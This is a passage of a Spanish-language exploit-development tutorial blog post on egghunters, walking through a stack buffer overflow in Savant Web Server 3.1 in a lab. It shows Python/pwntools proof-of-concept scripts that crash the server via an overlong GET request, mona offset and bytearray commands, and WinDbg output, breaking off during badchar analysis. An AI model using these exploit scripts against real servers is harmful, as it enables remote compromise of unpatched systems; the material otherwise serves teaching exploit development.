<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>5.0 - EggHunters</title>

  <meta name="description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="5.0 - EggHunters">
  <meta name="twitter:description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploitdevelopment/seh/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="5.0 - EggHunters">
  <meta property="og:description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta property="og:image" content="/exploitdevelopment/seh/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploitdevelopment/seh/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="5.0 - EggHunters" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploitdevelopment" title="xchg2pwn" class="blog-button">Exploit Development</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#crashing">5.1 - Crashing Application</a></li>
        <li><a href="#offset">5.2 - Find Offset</a></li>
        <li><a href="#badchars">5.3 - Find Badchars</a></li>
        <li><a href="#opcode">5.4 - Find Opcode</a></li>
        <li><a href="#egg">5.5 - EggHunter</a></li>
        <li><a href="#win10">5.6 - EggHunter Win10</a></li>

        <!--
        <li><a href="#wow64">5.7 - EggHunter wow64</a></li>
        <li><a href="#seh">5.8 - EggHunter SEH</a></li>
        -->

      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploitdevelopment/seh/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">5.0 - EggHunters</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">En las explotaciones anteriores teniamos espacio suficiente para guardar el <code class="language-plaintext highlighter-rouge">shellcode</code> conociendo su ubicación, sin embargo hay aplicaciones con un espacio muy limitado que generalmente no es suficiente para un shellcode, aqui entra el <code class="language-plaintext highlighter-rouge">egghunter</code> que resumiendo su uso es un codigo mucho mas pequeño que busca el shellcode que esta en algun lugar de la memoria desconocido y lo ejecuta</p>
</section>

<section class="post" id="crashing">
<br><h3 class="post-title">5.1 - Crashing Application</h3><br>

<p class="plain-text">La aplicación que usaremos para ver esta técnica será nuevamente un programa real con un poco mas de complejidad de lo normal con la finalidad de aprender a adaptarnos a algunas restricciones, esta será <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/SavantWebServer_3.1/Savant.exe">Savant Web Server 3.1</a></p>
<a href="/exploitdevelopment/egghunters/0.png" target="_blank"><div><p><img src="/exploitdevelopment/egghunters/0.png"></p></div></a>

<p class="plain-text">Nuevamente evitaremos la detección de la vulnerabilidad para ahorrar tiempo y usaremos un exploit de <code class="language-plaintext highlighter-rouge">exploitdb</code> para crear nuestro <code class="language-plaintext highlighter-rouge">poc</code>, una pregunta podria ser ¿porque el tamaño especifico de solo <code class="language-plaintext highlighter-rouge">260</code> bytes?, lo veremos un poco mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">260</span><span class="p">

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"  </span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el poc podemos ver que corrompemos el programa y ahora el registro <code class="language-plaintext highlighter-rouge">eip</code> apunta a la dirección <code class="language-plaintext highlighter-rouge">0x41414141</code> ya que se ha desbordado algun buffer asignado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to Windows on port 80: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to Windows port 80</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(100c.1530): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00792ca0 ecx=a7da135b edx=00000000 esi=00792ca0 edi=0041703c  
eip=41414141 esp=042cea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
41414141 ??              ???</span>
</code></pre></div></div><br>

</section>

<section class="post" id="offset">
<br><h3 class="post-title">5.1 - Find Offset</h3><br>

<p class="plain-text">Nuestra idea es tener control sobre el registro <code class="language-plaintext highlighter-rouge">eip</code> pero para ello necesitamos cuantos bytes se necesitan antes de sobrescribirlo, para ello podemos usar <code class="language-plaintext highlighter-rouge">mona</code> y crear un patron de caracteres que nos ayudaran a encontrar esa cantidad de bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:008> </span><span class="p">!py mona pattern_create 260
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_create 260
Creating cyclic pattern of 260 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai  
[+] Preparing output file 'pattern.txt'
    - (Re)setting logfile C:\mona\pattern.txt
Note: don't copy this pattern from the log window, it might be truncated !
It's better to open C:\mona\pattern.txt and copy the pattern from the file</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cambiamos las <code class="language-plaintext highlighter-rouge">260 A's</code> del payload por este patrón y enviamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"  </span><span class="p">

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez enviado el exploit el programa corrompe sin embargo ahora no apunta a <code class="language-plaintext highlighter-rouge">0x41414141</code> sino a <code class="language-plaintext highlighter-rouge">0x69413469</code> que es parte del patron de caracteres de mona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1bf4.1858): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00642ca0 ecx=f62ed552 edx=00000000 esi=00642ca0 edi=0041703c  
eip=69413469 esp=0429ea1c ebp=41336941 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
69413469 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que sabemos esto podemos usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para calcular la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de sobrescribir el registro <code class="language-plaintext highlighter-rouge">eip</code>, que son solo <code class="language-plaintext highlighter-rouge">253</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona pattern_offset eip
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_offset eip
Looking for i4Ai in pattern of 500000 bytes
 - Pattern i4Ai (0x69413469) found in cyclic pattern at position 253  
Looking for i4Ai in pattern of 500000 bytes
Looking for iA4i in pattern of 500000 bytes
 - Pattern iA4i not found in cyclic pattern (uppercase)  
Looking for i4Ai in pattern of 500000 bytes
Looking for iA4i in pattern of 500000 bytes
 - Pattern iA4i not found in cyclic pattern (lowercase)</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que sabemos el offset podemos enviar <code class="language-plaintext highlighter-rouge">253 A's</code> hasta antes de sobrescribir el eip que lo haremos con <code class="language-plaintext highlighter-rouge">4 B's</code> y enviaremos <code class="language-plaintext highlighter-rouge">4 C's</code> adicionales que se deberian guardar justo donde inicia el <code class="language-plaintext highlighter-rouge">stack</code> por lo que el registro esp deberia apuntar a esas <code class="language-plaintext highlighter-rouge">C's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="p">253
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">stack

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload</span><span class="o"> + </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Hay un problema, cuando enviamos un payload mayor a <code class="language-plaintext highlighter-rouge">260</code> corrompemos la aplicación pero el error es diferente por lo que no tenemos control sobre el <code class="language-plaintext highlighter-rouge">eip</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(114c.9b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=43434343 ebx=02462ca0 ecx=00600000 edx=00600000 esi=02462ca0 edi=0041703c
eip=0040c05f esp=042fe6a8 ebp=042fea14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
Savant+0xc05f:
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:002b:43434343=????????  </span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar este problema quitaremos los 4 bytes que se almacenarian en el stack y veremos como se comporta el programa, por ahora nos quedamos que el espacio que tenemos para guardar instrucciones es de apenas <code class="language-plaintext highlighter-rouge">3</code> bytes que no nos sirven</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora el eip se sobrescribe con <code class="language-plaintext highlighter-rouge">0x42424242</code>, al revisar los bytes del stack encontramos 2 cosas interesantes, la primera es que el primer byte del dword es un <code class="language-plaintext highlighter-rouge">0x00</code> lo que quiere decir que despues de escribir nuestra cadena escribe un null byte</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1f74.bf8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=01fe2ca0 ecx=308ab9d2 edx=00000000 esi=01fe2ca0 edi=0041703c  
eip=42424242 esp=0429ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
42424242 ??              ???

</span><span class="ro">0:000> </span><span class="p">dd esp L4
0429ea1c  0429fe00 0429ea74 0041703c 01fe2ca0</span>
</code></pre></div></div><br>

<p class="plain-text">Lo segundo es que parecen punteros, al escribir el null byte en el primer <code class="language-plaintext highlighter-rouge">dword</code> este sera invalido pero al revisar que hay en el segundo podemos ver que este apunta al <code class="language-plaintext highlighter-rouge">inicio</code> de nuestro input, tenemos una forma de saber donde se encuentra el input</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 4)
0429ea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............  
0429ea84  00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41  ......../AAAAAAA  
0429ea94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eaa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eab4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eac4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429ead4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eae4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="badchars">
<br><h3 class="post-title">5.3 - Find Badchars</h3><br>

<p class="plain-text">Ya que sabemos como podemos encontrar nuestro payload intentaremos detectar los <code class="language-plaintext highlighter-rouge">badchars</code>, igual a posts anteriores podemos iniciar creando un <code class="language-plaintext highlighter-rouge">bytearray</code> con mona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona bytearray
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray
Generating table, excluding 0 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  

Done, wrote 256 bytes to file C:\mona\bytearray.txt
Binary output saved in C:\mona\bytearray.bin</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos la limitación de espacio despues de sobrescribir la dirección de retorno enviaremos los badchars al inicio del input después del metodo indicado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(badchars))

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">badchars </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Hay un problema, al enviar el exploit esta vez el programa ni siquiera corrompe, ¿porque? es probable que alguno de los <code class="language-plaintext highlighter-rouge">badchars</code> delimiten la petición y corten la cadena por lo que ni siquiera logramos sobrescribir la dirección de retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Debuggee is running...</span>
</code></pre></div></div><br>

<p class="plain-text">¿Que podemos hacer?, en realidad hay 2 opciones para identificar los badchars:</code>
<p class="plain-text">• Comentar lineas de badchars para identificar en que parte de estos el programa corrompe para descartarlos linea por linea.</p>
<p class="plain-text">• Eliminar los badchars que de acuerdo al contexto podrian darnos problemas como el <code class="language-plaintext highlighter-rouge">0x00</code>, <code class="language-plaintext highlighter-rouge">0x0a</code> y <code class="language-plaintext highlighter-rouge">0x0d</code> que equivalen a <code class="language-plaintext highlighter-rouge">\0</code>, <code class="language-plaintext highlighter-rouge">\n</code> y <code class="language-plaintext highlighter-rouge">\r</code> que como vimos en <a href="/exploitdevelopment/stack/#badchars">posts</a> pasados podrian tomar otra función dentro de una petición <code class="language-plaintext highlighter-rouge">http</code> y corromperlo.</p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona bytearray -cpb '\x00\x0a\x0d'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray -cpb '\x00\x0a\x0d'
Generating table, excluding 3 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"  
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"  
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"  
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"  
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"  
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"  
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"  
"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez quitamos los <code class="language-plaintext highlighter-rouge">3</code> bytes que podrian darnos problemas modificamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
